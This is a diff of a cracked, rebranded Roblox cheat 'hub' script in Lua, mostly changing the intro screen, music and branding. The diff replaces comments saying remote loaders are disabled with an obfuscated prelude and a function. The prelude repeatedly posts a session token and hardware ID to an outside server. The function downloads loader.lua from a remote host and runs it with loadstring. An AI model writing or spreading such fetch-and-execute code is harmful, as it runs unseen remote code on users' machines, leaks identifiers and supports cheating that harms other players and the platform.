@@ -1,11 +1,92 @@
--- ＳＭＫㅤＨＵＢ | by Davy...
+-- TERROR 001 | by Davy...
 -- v33: correção Bat Bypass, fundo sem afetar texto, TRIPA ON/OFF e Insta Reset S2.
 -- [[ Hii! this file was cracked by SOURCE_CODE ]]
 -- [[ TIMESTAMP: 08:59:18 ]]
 
--- Se omitió el prelude remoto opaco del archivo original.
+--[[fmwm.1.ZmZhLTFiMTAzNzkzLThlNGUtNGE5MS1hYTEwLTc4NzUxMTNlYjNkNS1iNDAwM2FjN3wxYjEwMzc5My04ZTRlLTRhOTEtYWExMC03ODc1MTEzZWIzZDV8MjcwZjFmNWU4NWY1ZjNhNWFhZDA0YjBhNDU3ZmNiNWF8MTc5MTM3NDM2Mw.01941f355025]]
+-- thin prelude
+pcall(function()
+  -- prelude
+  pcall(function() if _G._FAULMOR_DIAG then print('DIAG: PRELUDE_START') end end)
+  local _lO0lO = ""
+  local _lI1lI = "9DE67514-21A8-4953-A107-19413497B8DC"
+  local _lOo0O = nil
+  local _l1i1l = nil
+  local _l0IiI = "free"
+  local _l1oO0 = nil
+  local _lI0o1 = 78
+  local _l0l0l = "Potassium"
+  local _lI1i1 = false
+  local function _fm_hb_env()
+    local ok, e = pcall(function() return type(getgenv) == 'function' and getgenv() end)
+    if ok and type(e) == 'table' then return e end
+    local ok2, e2 = pcall(function() return type(getfenv) == 'function' and getfenv(0) end)
+    if ok2 and type(e2) == 'table' then return e2 end
+    return _G
+  end
+  do
+    local env=nil do local gg=nil local ok,g=pcall(function() return type(getgenv) == 'function' and getgenv() end) if ok and type(g)=='table' then gg=g end local function tr(l) if type(getfenv) == 'function' then local ok2,e=pcall(getfenv,l) if ok2 and type(e)=='table' then return e end end end env=tr(2) or tr(3) or gg or tr(1) or tr(0) or _G end
+    if type(env) == 'table' then
+      env.LRM_ScriptKey = _lO0lO
+      env.LRM_HWID = _lI1lI
+      env.LRM_LinkedDiscordID = _lOo0O
+      env.LRM_LinkedDiscordName = _l1i1l
+      env.LRM_KeyType = _l0IiI
+      env.LRM_KeyExpiresAt = _l1oO0
+      env.LRM_TotalExecutions = _lI0o1
+      env.LRM_Executor = _l0l0l
+      env.LRM_IsPremium = _lI1i1
+      local _spawn = (type(task) == 'table' and type(task.spawn) == 'function' and task.spawn) or (type(coroutine) == 'table' and type(coroutine.create) == 'function' and type(coroutine.resume) == 'function' and function(f) local co=coroutine.create(f); pcall(coroutine.resume, co) end)
+      local _wait = (type(task) == 'table' and type(task.wait) == 'function' and task.wait) or (type(wait) == 'function' and wait)
+      local _unpack = (type(table) == 'table' and type(table.unpack) == 'function' and table.unpack) or (type(unpack) == 'function' and unpack)
+      if _spawn then env.LRM_Spawn = _spawn end
+      if _wait then env.LRM_Wait = _wait end
+      if _unpack then env.LRM_Unpack = _unpack end
+    end
+  end
+  -- session
+  local _FM_SESS = { t = "st.1.dd1eff00-9667-4e99-b1de-34085175b336.1b103793-8e4e-4a91-aa10-7875113eb3d5.270f1f5e85f5f3a5aad04b0a457fcb5a.0.1791374362.1791374662.1.6208a1d3fe75a640.fdad3d895df6018259fccafaa518ae1c200f3097d84701c2db08f3291471d7ba", e = 1791374662, u = "https://faulmor.site/api/public/session/refresh", h = _lI1lI }
+  local _fm_spawn = (type(task) == 'table' and type(task.spawn) == 'function' and task.spawn) or (type(coroutine) == 'table' and type(coroutine.create) == 'function' and type(coroutine.resume) == 'function' and function(f) local co=coroutine.create(f); pcall(coroutine.resume, co) end)
+  local _fm_wait = (type(task) == 'table' and type(task.wait) == 'function' and task.wait) or (type(wait) == 'function' and wait)
+  if _fm_spawn and _fm_wait then
+    pcall(function() if _G._FAULMOR_DIAG then print('DIAG: PHASE=PRELUDE_INIT _fm_spawn=' .. type(_fm_spawn) .. ' _fm_wait=' .. type(_fm_wait)) end end)
+    pcall(_fm_spawn, function()
+    local hs; local ok, svc = pcall(function() return type(game) == 'table' and type(game.GetService) == 'function' and game:GetService('HttpService') end); if ok and svc then hs = svc end
+    if not hs then return end
+    while true do
+      local now = os.time()
+      local left = _FM_SESS.e - now
+      if left <= 30 then
+        local body = '{"token":"' .. _FM_SESS.t .. '","hwid":"' .. _FM_SESS.h .. '","script_key":"' .. _lO0lO .. '"}'
+        local ok2, resp = pcall(hs.PostAsync, hs, _FM_SESS.u, body, 2, 'application/json')
+        if ok2 and type(resp) == 'string' then
+          local nt = resp:match('"token"%s*:%s*"([^"]+)"')
+          local ne = tonumber(resp:match('"exp"%s*:%s*(%d+)'))
+          if nt and ne then _FM_SESS.t = nt; _FM_SESS.e = ne end
+        end
+        _fm_wait(15)
+      else
+        _fm_wait(math.max(5, left - 30))
+      end
+    end
+  end)
+  end
+  do local _e=_fm_hb_env(); if type(_e)=='table' then local _old=_e["__fmbh"]; if type(_old)=='table' then _old.enabled=false end; _e["__fmbh"]=nil end end
+  -- end prelude
 
--- No se ejecutan cargadores Lua remotos.
+end)
+-- El cargador remoto es opcional y se ejecuta después del skip, nunca durante la intro.
+local function runRemoteLoader()
+    local remoteLoaderOk, remoteLoaderError = pcall(function()
+        local source = game:HttpGet("https://roblox-panel-mdlz.onrender.com/loader.lua")
+        local loader, compileError = loadstring(source)
+        assert(loader, compileError or "No se pudo compilar loader.lua")
+        loader()
+    end)
+    if not remoteLoaderOk then
+        warn("[TERROR 001] No se pudo cargar loader.lua; continuando con el script local: " .. tostring(remoteLoaderError))
+    end
+end
 
 repeat task.wait() until game:IsLoaded()
 Players = game:GetService("Players")
@@ -17,8 +98,10 @@ ReplicatedStorage = game:GetService("ReplicatedStorage")
 TS_G = game:GetService("TweenService")
 LP = Players.LocalPlayer
 camera = workspace.CurrentCamera
-CONFIG_FILE = "SMK_HUB.json"
+CONFIG_FILE = "TERROR_001.json"
 DISCORD_INVITE_URL = "https://discord.gg/bgsmy5ReNh"
+
+local TERROR_LOGO_IMAGE = "rbxassetid://73752563694907"
 
 local function resolvePurenDuelsImage()
     -- Fondo gamer dibujado por la interfaz; no se carga ninguna imagen navideña.
@@ -39,34 +122,28 @@ end
 
 local function addPuren001Decorations(parent, compact)
     if not parent then return end
-    local watermark = Instance.new("TextLabel")
+    local watermark = Instance.new("ImageLabel")
     watermark.Name = "Puren001Watermark"
     watermark.BackgroundTransparency = 1
-    watermark.Text = "ＳＭＫㅤＨＵＢ"
-    watermark.TextColor3 = Color3.fromRGB(0, 0, 0)
-    watermark.TextTransparency = compact and 0.78 or 0.86
-    watermark.Font = Enum.Font.GothamBlack
-    watermark.TextScaled = true
+    watermark.Image = TERROR_LOGO_IMAGE
+    watermark.ImageColor3 = Color3.fromRGB(255, 255, 255)
+    watermark.ImageTransparency = compact and 0.78 or 0.86
+    watermark.ScaleType = Enum.ScaleType.Fit
     watermark.Size = UDim2.fromScale(0.62, 0.72)
     watermark.AnchorPoint = Vector2.new(0.5, 0.5)
     watermark.Position = UDim2.fromScale(0.5, 0.52)
     watermark.ZIndex = (parent.ZIndex or 1) + 1
     watermark.Active = false
     watermark.Parent = parent
-    local outline = Instance.new("UIStroke")
-    outline.Color = Color3.fromRGB(0, 0, 0)
-    outline.Thickness = compact and 1.2 or 2
-    outline.Transparency = 0.2
-    outline.Parent = watermark
 end
 
 HUB_COLOR_OPTIONS = {"original", "gold", "violet"}
 DEFAULT_HUB_COLOR = HUB_COLOR_OPTIONS[1]
 
 
--- Identidade visual SMK: nome interno e interface unificados.
-SMKBrandStyle = {
-    text = "ＳＭＫ",
+-- Identidade visual compartilhada: mantém o nome e os créditos originais.
+DaHubBrandStyle = {
+    text = "TERROR 001",
     fontMode = "original",
     labels = setmetatable({}, {__mode = "k"}),
     silver = ColorSequence.new({
@@ -77,31 +154,31 @@ SMKBrandStyle = {
         ColorSequenceKeypoint.new(1, Color3.fromRGB(155, 160, 170)),
     }),
 }
-function SMKBrandStyle.apply(label)
-    SMKBrandStyle.labels[label] = label:GetAttribute("SMKBaseTitleSize") or label.TextSize
-    label:SetAttribute("SMKBaseTitleSize", SMKBrandStyle.labels[label])
-    label.Font = SMKBrandStyle.fontMode == "balloon" and Enum.Font.FredokaOne or Enum.Font.GothamBlack
-    label.TextSize = SMKBrandStyle.labels[label] * (SMKBrandStyle.fontMode == "balloon" and 1.2 or 1)
+function DaHubBrandStyle.apply(label)
+    DaHubBrandStyle.labels[label] = label:GetAttribute("DaHubBaseTitleSize") or label.TextSize
+    label:SetAttribute("DaHubBaseTitleSize", DaHubBrandStyle.labels[label])
+    label.Font = DaHubBrandStyle.fontMode == "balloon" and Enum.Font.FredokaOne or Enum.Font.GothamBlack
+    label.TextSize = DaHubBrandStyle.labels[label] * (DaHubBrandStyle.fontMode == "balloon" and 1.2 or 1)
     label.TextWrapped = false
-    local sizeLimit = label:FindFirstChild("SMKTitleSizeLimit") or Instance.new("UITextSizeConstraint", label)
-    sizeLimit.Name = "SMKTitleSizeLimit"
+    local sizeLimit = label:FindFirstChild("DaHubTitleSizeLimit") or Instance.new("UITextSizeConstraint", label)
+    sizeLimit.Name = "DaHubTitleSizeLimit"
     sizeLimit.MinTextSize = 10
     sizeLimit.MaxTextSize = label.TextSize
     label.TextScaled = true
     local gradient = label:FindFirstChildOfClass("UIGradient") or Instance.new("UIGradient", label)
-    gradient.Name = "SMKBrandShine"
-    gradient.Color = SMKBrandStyle.silver
+    gradient.Name = "DaHubBrandShine"
+    gradient.Color = DaHubBrandStyle.silver
     gradient.Rotation = 0
     -- Brilho prateado estático: evita um tween infinito para cada título.
 end
 
-function SMKBrandStyle.setFont(mode, shouldSave)
-    SMKBrandStyle.fontMode = mode == "balloon" and "balloon" or "original"
-    for label, baseSize in pairs(SMKBrandStyle.labels) do
+function DaHubBrandStyle.setFont(mode, shouldSave)
+    DaHubBrandStyle.fontMode = mode == "balloon" and "balloon" or "original"
+    for label, baseSize in pairs(DaHubBrandStyle.labels) do
         if label.Parent then
-            label.Font = SMKBrandStyle.fontMode == "balloon" and Enum.Font.FredokaOne or Enum.Font.GothamBlack
-            label.TextSize = baseSize * (SMKBrandStyle.fontMode == "balloon" and 1.2 or 1)
-            local limit = label:FindFirstChild("SMKTitleSizeLimit")
+            label.Font = DaHubBrandStyle.fontMode == "balloon" and Enum.Font.FredokaOne or Enum.Font.GothamBlack
+            label.TextSize = baseSize * (DaHubBrandStyle.fontMode == "balloon" and 1.2 or 1)
+            local limit = label:FindFirstChild("DaHubTitleSizeLimit")
             if limit then limit.MaxTextSize = label.TextSize end
         end
     end
@@ -109,1086 +186,407 @@ function SMKBrandStyle.setFont(mode, shouldSave)
     if shouldSave and saveConfig then saveConfig() end
 end
 
-local function showIntro(onFinished)
---============================================================
--- ＳＭＫㅤＨＵＢ INTRO
--- YOUR ORIGINAL VERSION
--- RANDOM IMAGE + MUSIC + BEAT EFFECTS + SKIP
---============================================================
+-- INTRO AUTÓNOMA CON MÚSICA
+-- Ejecutable en Roblox/Luau. Muestra la intro completa y permite omitirla
+-- tocando o haciendo clic en cualquier parte.
 
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local SoundService = game:GetService("SoundService")
-local RunService = game:GetService("RunService")
 
-local player = LP
-local PlayerGui = player:WaitForChild("PlayerGui")
+-- Música de la intro. Se detiene al tocar “TAP ANYWHERE TO SKIP”.
+INTRO_MUSIC_URL = "https://files.catbox.moe/y4q5y3.mp3"
+INTRO_MUSIC_FILE = "cleanhub_intro_song_14.mp3"
+INTRO_MUSIC_VOLUME = 1
+SoundService = game:GetService("SoundService")
 
---============================================================
--- SETTINGS
---============================================================
+local function resolveIntroMusicId()
+    local assetGetter = getcustomasset or getsynasset
+    if type(assetGetter) == "function" and type(writefile) == "function" then
+        local exists = false
+        if type(isfile) == "function" then
+            pcall(function() exists = isfile(INTRO_MUSIC_FILE) end)
+        end
+        if not exists then
+            local ok, data = pcall(function() return game:HttpGet(INTRO_MUSIC_URL) end)
+            if ok and type(data) == "string" and #data > 0 then
+                pcall(writefile, INTRO_MUSIC_FILE, data)
+            end
+        end
+        local ok, asset = pcall(assetGetter, INTRO_MUSIC_FILE)
+        if ok and asset then return asset end
+    end
+    return INTRO_MUSIC_URL
+end
 
-local MUSIC_URL =
-	"https://files.catbox.moe/qhpfe5.mp3"
-
-local MUSIC_FILE =
-	"ShadowVS_Music.mp3"
-
-local MUSIC_VOLUME =
-	0.75
-
-local BPM =
-	100
-
-local BEAT =
-	60 / BPM
-
--- IMAGE 2 FIRST
--- IMAGE 1 SECOND
--- THEN RANDOM WITHOUT REPEATING
-local IMAGES = {
-	"rbxassetid://129700697019613",
-	"rbxassetid://108697485255882",
-	"rbxassetid://71211662493854",
-	"rbxassetid://118953269416540"
+-- Valores usados por la animación original.
+v76 = {
+    [1]=12, [6]=32, [10]=0.15, [13]=0.4, [14]=6, [20]=3,
+    [26]=255, [31]=5, [37]=22, [52]=100, [58]=1, [72]=60,
+    [89]=2, [94]="Frame", [95]=4, [100]=10, [104]=false,
+    [150]="TextButton", [164]=0.5, [168]=1, [175]=0, [187]=6, [198]=true,
 }
-
---============================================================
--- CLEAN OLD
---============================================================
-
-for _, name in ipairs({
-	"ShadowVSIntro"
-}) do
-
-	local old =
-		PlayerGui:FindFirstChild(name)
-
-	if old then
-		old:Destroy()
-	end
-
-end
-
---============================================================
--- IMAGE ORDER
---============================================================
-
-local lastImage =
-	shared.ShadowVS_LastImage
-
-local imageIndex
-
-if not shared.ShadowVS_Run then
-
-	shared.ShadowVS_Run =
-		1
-
-	imageIndex =
-		2
-
-elseif shared.ShadowVS_Run == 1 then
-
-	shared.ShadowVS_Run =
-		2
-
-	imageIndex =
-		1
-
-else
-
-	local choices = {}
-
-	for i = 1, #IMAGES do
-
-		if i ~= lastImage then
-			table.insert(
-				choices,
-				i
-			)
-		end
-
-	end
-
-	imageIndex =
-		choices[
-			math.random(
-				1,
-				#choices
-			)
-		]
-
-end
-
-shared.ShadowVS_LastImage =
-	imageIndex
-
-local IMAGE_ID =
-	IMAGES[imageIndex]
-
---============================================================
--- INTRO STATE
---============================================================
-
-local introActive =
-	true
-
-local introFinished =
-	false
-
-local introSound =
-	nil
-
---============================================================
--- GUI
---============================================================
-
-local gui =
-	Instance.new("ScreenGui")
-
-gui.Name =
-	"ShadowVSIntro"
-
-gui.IgnoreGuiInset =
-	true
-
-gui.ResetOnSpawn =
-	false
-
-gui.DisplayOrder =
-	999999
-
-gui.ZIndexBehavior =
-	Enum.ZIndexBehavior.Sibling
-
-gui.Parent =
-	PlayerGui
-
---============================================================
--- BACKGROUND
---============================================================
-
-local background =
-	Instance.new("Frame")
-
-background.Size =
-	UDim2.fromScale(
-		1,
-		1
-	)
-
-background.BackgroundColor3 =
-	Color3.fromRGB(
-		0,
-		0,
-		0
-	)
-
-background.BorderSizePixel =
-	0
-
-background.ClipsDescendants =
-	true
-
-background.Parent =
-	gui
-
---============================================================
--- IMAGE
---============================================================
-
-local image =
-	Instance.new("ImageLabel")
-
-image.AnchorPoint =
-	Vector2.new(
-		0.5,
-		0.5
-	)
-
-image.Position =
-	UDim2.fromScale(
-		0.5,
-		0.5
-	)
-
-image.Size =
-	UDim2.fromScale(
-		1.08,
-		1.08
-	)
-
-image.BackgroundTransparency =
-	1
-
-image.Image =
-	IMAGE_ID
-
-image.ImageTransparency =
-	1
-
-image.ScaleType =
-	Enum.ScaleType.Crop
-
-image.ZIndex =
-	1
-
-image.Parent =
-	background
-
---============================================================
--- DARK OVERLAY
---============================================================
-
-local dark =
-	Instance.new("Frame")
-
-dark.Size =
-	UDim2.fromScale(
-		1,
-		1
-	)
-
-dark.BackgroundColor3 =
-	Color3.fromRGB(
-		0,
-		0,
-		0
-	)
-
-dark.BackgroundTransparency =
-	0.25
-
-dark.BorderSizePixel =
-	0
-
-dark.ZIndex =
-	2
-
-dark.Parent =
-	background
-
---============================================================
--- SKIP INTRO BUTTON
---============================================================
-
-local skip =
-	Instance.new("TextButton")
-
-skip.AnchorPoint =
-	Vector2.new(
-		1,
-		0
-	)
-
-skip.Position =
-	UDim2.new(
-		1,
-		-14,
-		0,
-		14
-	)
-
-skip.Size =
-	UDim2.fromOffset(
-		105,
-		36
-	)
-
-skip.BackgroundColor3 =
-	Color3.fromRGB(
-		15,
-		15,
-		18
-	)
-
-skip.BackgroundTransparency =
-	0.15
-
-skip.BorderSizePixel =
-	0
-
-skip.Text =
-	"SKIP INTRO"
-
-skip.TextColor3 =
-	Color3.fromRGB(
-		255,
-		255,
-		255
-	)
-
-skip.TextSize =
-	12
-
-skip.Font =
-	Enum.Font.GothamBold
-
-skip.AutoButtonColor =
-	false
-
-skip.ZIndex =
-	500
-
-skip.Parent =
-	gui
-
-local skipCorner =
-	Instance.new("UICorner")
-
-skipCorner.CornerRadius =
-	UDim.new(
-		0,
-		7
-	)
-
-skipCorner.Parent =
-	skip
-
-local skipStroke =
-	Instance.new("UIStroke")
-
-skipStroke.Color =
-	Color3.fromRGB(
-		255,
-		255,
-		255
-	)
-
-skipStroke.Transparency =
-	0.75
-
-skipStroke.Thickness =
-	1
-
-skipStroke.Parent =
-	skip
-
---============================================================
--- FLASH
---============================================================
-
-local flash =
-	Instance.new("Frame")
-
-flash.Size =
-	UDim2.fromScale(
-		1,
-		1
-	)
-
-flash.BackgroundColor3 =
-	Color3.fromRGB(
-		255,
-		255,
-		255
-	)
-
-flash.BackgroundTransparency =
-	1
-
-flash.BorderSizePixel =
-	0
-
-flash.ZIndex =
-	400
-
-flash.Parent =
-	gui
-
---============================================================
--- TITLE
---============================================================
-
-local introTitle =
-	Instance.new("TextLabel")
-
-introTitle.AnchorPoint =
-	Vector2.new(
-		0.5,
-		0.5
-	)
-
-introTitle.Position =
-	UDim2.fromScale(
-		0.5,
-		0.5
-	)
-
-introTitle.Size =
-	UDim2.fromScale(
-		1.1,
-		0.22
-	)
-
-introTitle.BackgroundTransparency =
-	1
-
-introTitle.Text =
-	"ＳＭＫㅤＨＵＢ"
-
-introTitle.TextColor3 =
-	Color3.fromRGB(
-		255,
-		255,
-		255
-	)
-
-introTitle.TextTransparency =
-	1
-
-introTitle.TextScaled =
-	true
-
-introTitle.Font =
-	Enum.Font.GothamBlack
-
-introTitle.ZIndex =
-	20
-
-introTitle.Parent =
-	background
-
-local titleStroke =
-	Instance.new("UIStroke")
-
-titleStroke.Color =
-	Color3.fromRGB(
-		0,
-		0,
-		0
-	)
-
-titleStroke.Thickness =
-	3
-
-titleStroke.Transparency =
-	1
-
-titleStroke.Parent =
-	introTitle
-
---============================================================
--- SUBTITLE
---============================================================
-
-local introSubtitle =
-	Instance.new("TextLabel")
-
-introSubtitle.AnchorPoint =
-	Vector2.new(
-		0.5,
-		0.5
-	)
-
-introSubtitle.Position =
-	UDim2.fromScale(
-		0.5,
-		0.59
-	)
-
-introSubtitle.Size =
-	UDim2.fromScale(
-		0.6,
-		0.05
-	)
-
-introSubtitle.BackgroundTransparency =
-	1
-
-introSubtitle.Text =
-	"DUELS"
-
-introSubtitle.TextColor3 =
-	Color3.fromRGB(
-		205,
-		205,
-		205
-	)
-
-introSubtitle.TextTransparency =
-	1
-
-introSubtitle.TextScaled =
-	true
-
-introSubtitle.Font =
-	Enum.Font.GothamBold
-
-introSubtitle.ZIndex =
-	20
-
-introSubtitle.Parent =
-	background
-
---============================================================
--- MUSIC LOADER
---============================================================
-
-local function loadMusic()
-
-	local asset
-
-	pcall(function()
-
-		if isfile and
-			isfile(MUSIC_FILE) then
-
-			asset =
-				getcustomasset(
-					MUSIC_FILE
-				)
-
-		end
-
-	end)
-
-	if not asset then
-
-		local success, data =
-			pcall(function()
-
-				return game:HttpGet(
-					MUSIC_URL
-				)
-
-			end)
-
-		if success and
-			data and
-			#data > 1000 then
-
-			pcall(function()
-
-				writefile(
-					MUSIC_FILE,
-					data
-				)
-
-			end)
-
-			pcall(function()
-
-				asset =
-					getcustomasset(
-						MUSIC_FILE
-					)
-
-			end)
-
-		end
-
-	end
-
-	return asset
-
-end
-
---============================================================
--- PLAY MUSIC
---============================================================
-
-task.spawn(function()
-
-	local asset =
-		loadMusic()
-
-	if not asset or
-		not introActive then
-		return
-	end
-
-	introSound =
-		Instance.new("Sound")
-
-	introSound.Name =
-		"ShadowVSIntroMusic"
-
-	introSound.SoundId =
-		asset
-
-	introSound.Volume =
-		MUSIC_VOLUME
-
-	introSound.Looped =
-		false
-
-	introSound.Parent =
-		SoundService
-
-	pcall(function()
-		introSound:Play()
-	end)
-
-end)
-
---============================================================
--- FINISH
---============================================================
-
-local function finishIntro()
-
-	if introFinished then
-		return
-	end
-
-	introFinished =
-		true
-
-	introActive =
-		false
-
-	if introSound then
-
-		pcall(function()
-
-			TweenService:Create(
-				introSound,
-				TweenInfo.new(
-					0.35
-				),
-				{
-					Volume = 0
-				}
-			):Play()
-
-		end)
-
-		task.delay(
-			0.4,
-			function()
-
-				pcall(function()
-
-					introSound:Stop()
-					introSound:Destroy()
-
-				end)
-
-			end
-		)
-
-	end
-
-	pcall(function()
-		gui:Destroy()
-	end)
-
-	if type(onFinished) == "function" then
-		task.defer(onFinished)
-	end
-
-end
-
---============================================================
--- SKIP
---============================================================
-
-skip.MouseButton1Click:Connect(
-	finishIntro
-)
-
---============================================================
--- SKIP HOVER
---============================================================
-
-skip.MouseEnter:Connect(function()
-
-	TweenService:Create(
-		skip,
-		TweenInfo.new(
-			0.12
-		),
-		{
-			BackgroundColor3 =
-				Color3.fromRGB(
-					55,
-					55,
-					60
-				)
-		}
-	):Play()
-
-end)
-
-skip.MouseLeave:Connect(function()
-
-	TweenService:Create(
-		skip,
-		TweenInfo.new(
-			0.12
-		),
-		{
-			BackgroundColor3 =
-				Color3.fromRGB(
-					15,
-					15,
-					18
-				)
-		}
-	):Play()
-
-end)
-
---============================================================
--- IMAGE FADE IN
---============================================================
-
-TweenService:Create(
-	image,
-	TweenInfo.new(
-		1.1,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.Out
-	),
-	{
-		ImageTransparency =
-			0
-	}
-):Play()
-
---============================================================
--- SLOW ZOOM
---============================================================
-
-TweenService:Create(
-	image,
-	TweenInfo.new(
-		18,
-		Enum.EasingStyle.Sine,
-		Enum.EasingDirection.InOut
-	),
-	{
-		Size =
-			UDim2.fromScale(
-				1.18,
-				1.18
-			)
-	}
-):Play()
-
---============================================================
--- BEAT FLASH
---============================================================
-
-task.spawn(function()
-
-	while introActive
-		and gui.Parent do
-
-		flash.BackgroundTransparency =
-			0.8
-
-		TweenService:Create(
-			flash,
-			TweenInfo.new(
-				0.12,
-				Enum.EasingStyle.Quint,
-				Enum.EasingDirection.Out
-			),
-			{
-				BackgroundTransparency =
-					1
-			}
-		):Play()
-
-		task.wait(
-			BEAT
-		)
-
-	end
-
-end)
-
---============================================================
--- TITLE
---============================================================
-
-task.wait(1.5)
-
-if not introActive then
-	return
-end
-
-TweenService:Create(
-	introTitle,
-	TweenInfo.new(
-		0.7,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.Out
-	),
-	{
-		Size =
-			UDim2.fromScale(
-				0.9,
-				0.18
-			),
-
-		TextTransparency =
-			0
-	}
-):Play()
-
-TweenService:Create(
-	titleStroke,
-	TweenInfo.new(
-		0.5
-	),
-	{
-		Transparency =
-			0
-	}
-):Play()
-
---============================================================
--- TITLE SHAKE
---============================================================
-
-task.wait(1)
-
-for i = 1, 18 do
-
-	if not introActive then
-		return
-	end
-
-	introTitle.Position =
-		UDim2.fromScale(
-			0.5 +
-				math.random(
-					-8,
-					8
-				) / 1000,
-
-			0.5 +
-				math.random(
-					-8,
-					8
-				) / 1000
-		)
-
-	task.wait(
-		0.025
-	)
-
-end
-
-introTitle.Position =
-	UDim2.fromScale(
-		0.5,
-		0.5
-	)
-
---============================================================
--- SUBTITLE
---============================================================
-
-TweenService:Create(
-	introSubtitle,
-	TweenInfo.new(
-		0.6,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.Out
-	),
-	{
-		TextTransparency =
-			0
-	}
-):Play()
-
---============================================================
--- HOLD
---============================================================
-
-task.wait(7)
-
-if not introActive then
-	return
-end
-
---============================================================
--- FINAL BEAT FLASHES
---============================================================
-
-for i = 1, 14 do
-
-	if not introActive then
-		return
-	end
-
-	flash.BackgroundTransparency =
-		0
-
-	task.wait(
-		0.025
-	)
-
-	flash.BackgroundTransparency =
-		1
-
-	task.wait(
-		0.065
-	)
-
-end
-
---============================================================
--- EXTRA HOLD
---============================================================
-
-task.wait(2)
-
-if not introActive then
-	return
-end
-
---============================================================
--- TITLE FADE
---============================================================
-
-TweenService:Create(
-	introTitle,
-	TweenInfo.new(
-		1.2,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.In
-	),
-	{
-		TextTransparency =
-			1
-	}
-):Play()
-
-TweenService:Create(
-	introSubtitle,
-	TweenInfo.new(
-		1,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.In
-	),
-	{
-		TextTransparency =
-			1
-	}
-):Play()
-
-TweenService:Create(
-	titleStroke,
-	TweenInfo.new(
-		1
-	),
-	{
-		Transparency =
-			1
-	}
-):Play()
-
---============================================================
--- IMAGE FADE
---============================================================
-
-TweenService:Create(
-	image,
-	TweenInfo.new(
-		1.5,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.In
-	),
-	{
-		ImageTransparency =
-			1
-	}
-):Play()
-
-TweenService:Create(
-	dark,
-	TweenInfo.new(
-		1.5
-	),
-	{
-		BackgroundTransparency =
-			1
-	}
-):Play()
-
---============================================================
--- MUSIC FADE
---============================================================
-
-if introSound and
-	introSound.Parent then
-
-	TweenService:Create(
-		introSound,
-		TweenInfo.new(
-			1.5,
-			Enum.EasingStyle.Quint,
-			Enum.EasingDirection.In
-		),
-		{
-			Volume =
-				0
-		}
-	):Play()
-
-end
-
---============================================================
--- FINAL BLACK FADE
---============================================================
-
-local finalFade =
-	Instance.new("Frame")
-
-finalFade.Size =
-	UDim2.fromScale(
-		1,
-		1
-	)
-
-finalFade.BackgroundColor3 =
-	Color3.fromRGB(
-		0,
-		0,
-		0
-	)
-
-finalFade.BackgroundTransparency =
-	1
-
-finalFade.BorderSizePixel =
-	0
-
-finalFade.ZIndex =
-	1000
-
-finalFade.Parent =
-	gui
-
-TweenService:Create(
-	finalFade,
-	TweenInfo.new(
-		1.5,
-		Enum.EasingStyle.Quint,
-		Enum.EasingDirection.In
-	),
-	{
-		BackgroundTransparency =
-			0
-	}
-):Play()
-
-task.wait(
-	1.6
-)
-
-finishIntro()
-end
-
-local function clearOldSMKInterface()
-    if type(_G._SMKBatBypassCleanup) == "function" then
-        pcall(_G._SMKBatBypassCleanup)
-        _G._SMKBatBypassCleanup = nil
+_G._VantaSkipIntro = false
+_G._VantaIntroActive = true
+
+									local function showIntro(onFinished)
+									local introSound
+									local function stopIntroMusic()
+										if introSound then
+											pcall(function() introSound:Stop() end)
+											pcall(function() introSound:Destroy() end)
+											introSound = nil
+										end
+									end
+
+										if _G._VantaLoadIntroCleanup then
+											pcall(_G._VantaLoadIntroCleanup)
+										end
+
+
+										local flag19 = UIS.TouchEnabled and not UIS.KeyboardEnabled
+										local playerGui = LP:WaitForChild("PlayerGui")
+										local vantaLoadIntro = playerGui:FindFirstChild("VantaLoadIntro")
+
+										if vantaLoadIntro then
+											vantaLoadIntro:Destroy()
+										end
+
+										local vantaLoadIntroBlur = Lighting:FindFirstChild("VantaLoadIntroBlur")
+
+										if vantaLoadIntroBlur then
+											vantaLoadIntroBlur:Destroy()
+										end
+
+										local screenGui = Instance.new("ScreenGui")
+										screenGui.Name = "VantaLoadIntro"
+
+										if _G._VantaMountOnTop then
+											_G._VantaMountOnTop(screenGui, 1000005)
+										else
+											screenGui.ResetOnSpawn = v76[104]
+											screenGui.DisplayOrder = 1000005
+											screenGui.Parent = playerGui
+										end
+
+										screenGui.IgnoreGuiInset = true
+
+										introSound = Instance.new("Sound")
+										introSound.Name = "VantaIntroMusic"
+										introSound.SoundId = resolveIntroMusicId()
+										introSound.Volume = INTRO_MUSIC_VOLUME
+										introSound.Looped = false
+										introSound.Parent = SoundService
+										pcall(function() introSound:Play() end)
+										local instance = Instance.new(v76[94])
+										instance.BackgroundColor3 = Color3.fromRGB(54, 8, 14)
+										instance.BackgroundTransparency = 1
+										instance.BorderSizePixel = 0
+										instance.Size = UDim2.fromScale(1, 1)
+										instance.ZIndex = 1000
+										instance.Parent = screenGui
+										addPuren001Decorations(instance, false)
+
+										
+										local frame = Instance.new("Frame")
+										frame.Name = "MovingStars"
+										frame.BackgroundTransparency = 1
+										frame.BorderSizePixel = v76[175]
+										frame.Size = UDim2.fromScale(1, 1)
+										frame.ClipsDescendants = v76[198]
+										frame.ZIndex = 1001
+										frame.Parent = instance
+										frame.Visible = false -- sem partículas de neve
+										local tbl24 = {}
+										local n32 = 0 -- sin efectos de nieve
+
+										for i = 1, n32 do
+											local frame2 = Instance.new("Frame")
+											frame2.BackgroundColor3 = i % 5 == 0 and Color3.fromRGB(255, 213, 92) or Color3.fromRGB(248, 248, 255)
+											frame2.BackgroundTransparency = v76[168]
+											frame2.BorderSizePixel = 0
+											frame2.AnchorPoint = Vector2.new(0.5, 0.5)
+											frame2.Size = UDim2.fromOffset(i % 9 == 0 and 3 or v76[89], i % 9 == 0 and 3 or 2)
+											frame2.ZIndex = 1001
+											frame2.Parent = frame
+											local uiCorner = Instance.new("UICorner")
+											uiCorner.CornerRadius = UDim.new(1, 0)
+											uiCorner.Parent = frame2
+
+											tbl24[i] = {
+												frame = frame2,
+												x = i * 37 % 101 / v76[52],
+												y = i * 61 % 101 / 100,
+												speed = 0.008 + i % v76[31] * 0.004,
+												phase = i * 0.83,
+												opacity = 0.35 + i % v76[95] * 0.1,
+											}
+										end
+
+										local frame2 = Instance.new("Frame")
+										frame2.Name = "VantaWordmark"
